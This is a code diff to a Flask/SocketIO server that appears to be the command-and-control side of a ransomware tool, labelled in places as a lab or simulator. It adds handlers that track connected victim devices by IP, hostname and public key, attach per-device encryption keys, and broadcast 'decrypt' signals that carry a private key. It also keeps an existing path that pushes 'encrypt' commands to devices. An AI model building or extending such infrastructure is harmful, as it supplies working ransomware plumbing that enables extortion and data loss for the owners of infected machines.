@@ -202,19 +202,56 @@ def decrypt():
     Otherwise, perform local simulator decryption as a fallback.
     """
     try:
-        # Emit to any connected devices
-        sent = 0
-        for token, info in list(DEVICES.items()):
-            if info.get('connected') and info.get('sid'):
-                socketio.emit('decrypt', to=info['sid'])
-                sent += 1
-        if sent:
-            return jsonify({'status': f'Decrypt signal sent to {sent} device(s)'}), 200
-        # Fallback local decrypt
-        simulator.simulate_decryption()
-        return jsonify({'status': 'Decryption completed locally'})
+        payload = request.get_json(silent=True) or {}
+        private_key_pem = payload.get('private_key_pem')
+        # Prefer a broadcast to all connected clients in this process, optionally passing a private key.
+        emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
+        socketio.emit('decrypt', emit_payload, broadcast=True)
+        # Also attempt local decrypt as a safety net (no harm if no local files)
+        try:
+            simulator.simulate_decryption()
+        except Exception:
+            pass
+        # Report approximate connected devices if available
+        connected = sum(1 for _t, info in DEVICES.items() if info.get('connected')) if DEVICES else None
+        if connected is not None:
+            return jsonify({'status': f'Decrypt signal broadcasted', 'connected_devices': connected}), 200
+        return jsonify({'status': 'Decrypt signal broadcasted'}), 200
     except Exception as e:
         return jsonify({'status': 'Decryption failed', 'error': str(e)}), 500
+
+@app.route('/devices', methods=['GET'])
+def devices_state():
+    """Inspect connected devices (lab diagnostics)."""
+    try:
+        out = []
+        for token, info in DEVICES.items():
+            out.append({
+                'token': token,
+                'connected': bool(info.get('connected')),
+                'ip': info.get('ip'),
+                'hostname': info.get('hostname'),
+                'has_sid': bool(info.get('sid')),
+                'public_key_pem': info.get('public_key_pem')
+            })
+        return jsonify({'count': len(out), 'devices': out})
+    except Exception as e:
+        return jsonify({'error': 'inspect_failed', 'message': str(e)}), 500
+
+@app.route('/devices/<token>/public-key', methods=['POST'])
+def set_device_public_key(token: str):
+    """Attach a site-generated public key to a device token (lab/demo)."""
+    try:
+        if token not in DEVICES:
+            return jsonify({'error': 'not_found'}), 404
+        data = request.get_json(silent=True) or {}
+        pem = data.get('public_key_pem')
+        if not pem:
+            return jsonify({'error': 'bad_request', 'message': 'public_key_pem required'}), 400
+        DEVICES[token]['public_key_pem'] = pem
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        return jsonify({'error': 'set_failed', 'message': str(e)}), 500
 
 @app.route('/behavior/notes', methods=['POST'])
 def behavior_notes():
@@ -267,3 +304,69 @@ def on_auth(data):
     if DEVICES[token].get('pending_encrypt'):
         socketio.emit('encrypt', to=request.sid)
         DEVICES[token]['pending_encrypt'] = False
+
+@socketio.on('device_hello')
+def on_device_hello(data):
+    """Receive device metadata and public key over the socket."""
+    try:
+        token = (data or {}).get('device_token')
+        if not token:
+            # Try to resolve from sid
+            sid = request.sid
+            for t, info in DEVICES.items():
+                if info.get('sid') == sid:
+                    token = t
+                    break
+        if not token or token not in DEVICES:
+            return
+        DEVICES[token]['public_key_pem'] = (data or {}).get('public_key_pem')
+        if (data or {}).get('hostname'):
+            DEVICES[token]['hostname'] = data['hostname']
+        # Update requester IP based on this socket connect if available
+        try:
+            from flask import request as _rq
+            ip = _rq.remote_addr
+            if ip:
+                DEVICES[token]['ip'] = ip
+        except Exception:
+            pass
+        emit('server_ack', {'status': 'ok'})
+    except Exception:
+        pass
+
+@socketio.on('disconnect')
+def on_disconnect():
+    # Mark any known device with this sid as disconnected
+    try:
+        sid = request.sid
+        for token, info in DEVICES.items():
+            if info.get('sid') == sid:
+                info['connected'] = False
+                info['sid'] = None
+                break
+    except Exception:
+        pass
+
+@socketio.on('site_public_key')
+def on_site_public_key(data):
+    """Site sends a public key to associate with a device token."""
+    try:
+        token = (data or {}).get('token')
+        pem = (data or {}).get('public_key_pem')
+        if not token or token not in DEVICES or not pem:
+            return emit('server_ack', {'status': 'error'})
+        DEVICES[token]['public_key_pem'] = pem
+        emit('server_ack', {'status': 'ok'})
+    except Exception:
+        emit('server_ack', {'status': 'error'})
+
+@socketio.on('site_decrypt')
+def on_site_decrypt(data):
+    """Site triggers decrypt broadcast, optionally carrying a private key."""
+    try:
+        private_key_pem = (data or {}).get('private_key_pem')
+        payload = {'private_key_pem': private_key_pem} if private_key_pem else None
+        socketio.emit('decrypt', payload, broadcast=True)
+        emit('server_ack', {'status': 'ok'})
+    except Exception as e:
+        emit('server_ack', {'status': 'error', 'message': str(e)})
